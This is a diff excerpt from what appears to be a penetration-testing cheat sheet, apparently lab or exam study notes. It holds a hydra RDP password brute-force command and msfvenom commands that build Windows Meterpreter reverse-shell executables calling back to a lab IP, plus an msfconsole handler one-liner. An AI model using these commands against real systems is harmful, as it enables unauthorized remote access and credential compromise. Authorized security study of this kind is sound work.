@@ -3129,8 +3129,9 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.237 LPORT=5555 --arch x64 --platform windows -f exe -o reverse.exe 
 
  	Meterpreter Reverse Shell 32-bit Windows:
-  		msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=192.168.45.237 LPORT=5555 --arch x86 --platform windows -f exe -o reverse_32bit.exe 
-
+  		msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.45.237 LPORT=5555 --arch x86 --platform windows -f exe -o reverse.exe
+		Set Payload To This Inside of Meterpreter: set payload windows/meterpreter/reverse_tcp
+  
 	Quick Access: sudo msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 192.168.45.237;set LPORT 5555;run;"
 	Note: It may take several times for a session to be initiated.
 
